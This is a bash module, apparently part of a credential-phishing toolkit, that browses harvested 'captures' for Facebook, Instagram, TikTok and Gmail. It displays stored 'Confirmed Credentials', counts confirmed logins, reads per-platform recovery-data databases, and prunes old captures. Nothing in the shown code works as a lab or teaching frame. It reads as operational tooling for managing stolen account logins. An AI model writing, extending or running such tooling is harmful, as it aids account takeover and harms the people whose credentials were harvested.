#!/bin/bash

# ============================================
# CAPTURE VIEWER MODULE
# ============================================

view_captures() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║                  CAPTURE VIEWER - BY PLATFORM                 ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    if [[ ! -d "$CAPTURES_DIR" ]]; then
        echo -e "${COLORS[WARNING]}[!] No captures directory found${COLORS[RESET]}"
        return
    fi
    
    echo -e "\n${COLORS[INFO]}Available Platforms:${COLORS[RESET]}"
    
    for platform in FB INS TK GML; do
        if [[ -d "$CAPTURES_DIR/$platform" ]]; then
            txt_count=$(find "$CAPTURES_DIR/$platform" -name "*.txt" 2>/dev/null | wc -l)
            
            case $platform in
                FB) platform_name="Facebook";;
                INS) platform_name="Instagram";;
                TK) platform_name="TikTok";;
                GML) platform_name="Gmail";;
            esac
            
            echo -e "${COLORS[SUCCESS]}[$platform] $platform_name - $txt_count captures${COLORS[RESET]}"
        fi
    done
    
    echo -e "\n${COLORS[MENU]}Options:${COLORS[RESET]}"
    echo -e "1) View Facebook Captures"
    echo -e "2) View Instagram Captures"
    echo -e "3) View TikTok Captures"
    echo -e "4) View Gmail Captures"
    echo -e "5) View All Summary"
    echo -e "6) Back"
    
    read -p "$(echo -e ${COLORS[INPUT]}"Select option [1-6]: "${COLORS[RESET]})" option
    
    case $option in
        1) display_platform_captures "FB" "Facebook";;
        2) display_platform_captures "INS" "Instagram";;
        3) display_platform_captures "TK" "TikTok";;
        4) display_platform_captures "GML" "Gmail";;
        5) display_all_summary;;
        6) return;;
    esac
}

display_platform_captures() {
    local platform=$1
    local platform_name=$2
    local capture_dir="$CAPTURES_DIR/$platform"
    
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║              $platform_name CAPTURES                          ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${COLORS[RESET]}"
    
    if [[ ! -d "$capture_dir" ]]; then
        echo -e "${COLORS[WARNING]}[!] No captures for $platform_name${COLORS[RESET]}"
        read -p "Press ENTER to continue..."
        return
    fi
    
    echo -e "\n${COLORS[INFO]}Recent Captures:${COLORS[RESET]}"
    ls -lht "$capture_dir"/*.txt 2>/dev/null | head -5
    
    if [[ -f "$capture_dir/CONFIRMED_SUMMARY.txt" ]]; then
        echo -e "\n${COLORS[SUCCESS]}Confirmed Credentials:${COLORS[RESET]}"
        tail -10 "$capture_dir/CONFIRMED_SUMMARY.txt"
    fi
    
    read -p "Press ENTER to continue..."
}

display_all_summary() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                    ALL CAPTURES SUMMARY                       ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${COLORS[RESET]}"
    
    local total=0
    for platform in FB INS TK GML; do
        if [[ -d "$CAPTURES_DIR/$platform" ]]; then
            count=$(find "$CAPTURES_DIR/$platform" -name "*.txt" 2>/dev/null | wc -l)
            total=$((total + count))
            echo -e "${COLORS[INFO]}$platform:${COLORS[RESET]} $count captures"
        fi
    done
    
    echo -e "\n${COLORS[SUCCESS]}TOTAL: $total captures${COLORS[RESET]}"
    read -p "Press ENTER to continue..."
}

view_recovery_data() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║              RECOVERY DATA ANALYSIS                           ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    for platform in FB INS TK GML; do
        if [[ -f "$CAPTURES_DIR/$platform/${platform}_recovery.db" ]]; then
            case $platform in
                FB) platform_name="Facebook";;
                INS) platform_name="Instagram";;
                TK) platform_name="TikTok";;
                GML) platform_name="Gmail";;
            esac
            
            echo -e "\n${COLORS[INFO]}$platform_name Recovery Data:${COLORS[RESET]}"
            
            recovery_count=$(sqlite3 "$CAPTURES_DIR/$platform/${platform}_recovery.db" \
                "SELECT COUNT(*) FROM recovery_data;" 2>/dev/null || echo "0")
            
            echo -e "  Total: ${COLORS[SUCCESS]}$recovery_count${COLORS[RESET]}"
        fi
    done
    
    read -p "Press ENTER to continue..."
}

analyze_confirmed_credentials() {
    clear
    echo -e "${COLORS[BANNER]}${COLORS[BOLD]}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════╗
║              CONFIRMED CREDENTIALS ANALYSIS                   ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${COLORS[RESET]}"
    
    for platform in FB INS TK GML; do
        if [[ -f "$CAPTURES_DIR/$platform/CONFIRMED_SUMMARY.txt" ]]; then
            case $platform in
                FB) platform_name="Facebook";;
                INS) platform_name="Instagram";;
                TK) platform_name="TikTok";;
                GML) platform_name="Gmail";;
            esac
            
            echo -e "\n${COLORS[INFO]}$platform_name:${COLORS[RESET]}"
            grep -c "✅ CONFIRMED" "$CAPTURES_DIR/$platform/CONFIRMED_SUMMARY.txt" 2>/dev/null | while read count; do
                echo -e "  Confirmed: ${COLORS[SUCCESS]}$count${COLORS[RESET]}"
            done
        fi
    done
    
    read -p "Press ENTER to continue..."
}

clean_old_captures() {
    echo -e "\n${COLORS[WARNING]}[!] This will delete captures older than 7 days${COLORS[RESET]}"
    read -p "Continue? [y/N]: " confirm
    
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        find "$CAPTURES_DIR" -name "*.txt" -mtime +7 -delete 2>/dev/null
        echo -e "${COLORS[SUCCESS]}[✓] Old captures cleaned${COLORS[RESET]}"
    fi
}